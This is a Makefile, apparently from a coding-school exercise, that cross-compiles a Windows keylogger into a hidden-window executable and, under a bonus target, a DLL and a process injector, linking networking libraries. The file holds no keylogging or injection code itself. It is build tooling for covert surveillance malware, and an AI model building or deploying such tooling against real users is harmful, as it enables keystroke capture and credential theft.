SRCS = keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c
MINGW_CC = x86_64-w64-mingw32-gcc
CFLAGS ?= -O2 -mwindows
WINLIBS = -luser32 -lpsapi -lws2_32 -lwinhttp -ldxgi

all: winkey.exe

winkey.exe: $(SRCS) keylog/exemain.c
	$(MINGW_CC) $(CFLAGS) -o $@ $^ $(WINLIBS)

bonus: keylogger.dll injector.exe

keylogger.dll: keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c keylog/dllmain.c
	$(MINGW_CC) $(CFLAGS) -shared -o $@ $^ $(WINLIBS)

injector.exe: keylog/injector.c
	$(MINGW_CC) $(CFLAGS) -o $@ $< $(WINLIBS)

clean:
	rm -f *.o *.obj

fclean: clean
	@echo "Cleaning up..."
	rm -f *.exe *.dll

re: fclean all
